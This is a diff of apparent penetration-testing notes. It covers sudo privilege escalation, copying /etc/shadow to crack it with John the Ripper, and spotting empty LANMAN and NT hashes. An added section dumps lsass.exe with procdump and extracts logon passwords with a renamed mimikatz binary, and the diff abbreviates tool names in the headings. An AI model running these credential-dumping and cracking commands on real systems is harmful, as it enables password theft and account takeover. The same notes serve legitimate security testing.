@@ -5,7 +5,7 @@ sudo -l #what access? if you have access to debuggers ex /usr/bin/gdb - sudo gdb
 sudo su #it couldn't be that easy
 
 
---# john - nix #--
+--# JOHN - NIX #--
 
 copy /etc/shadow, /etc/passwd
 chown /etc/shadow
@@ -23,7 +23,7 @@ john --format=descrypt --single #single crack mode; uses variation of account na
 -wordlist filename #use filename as wordlist to dict attack; hybrid with single
 -incremental #brute force
 
---# hashcat #--
+--# HASHC #--
 look for hashes that do not have these two patterns: aadb:dcfed
 =LANMAN hashes=
 aad[#]b - A A D B - indicates this is an empty LANMAN hash - not active account  eg Admin:500:aad3b435b510413eeeeaadb
@@ -31,3 +31,9 @@ aad[#]b - A A D B - indicates this is an empty LANMAN hash - not active account 
 
 NT hashes - D C F E D - 21d5cfe0d - indicates this is an empty NT hash - not active account - eg Admin:500:aad3b435b510413eeeeaabetc:21d5cfe0d
 #mnemonic device - Dumb Crypto Fucks Everything Disastrously
+
+--# MKATX #--
+.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mk.exe
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords full
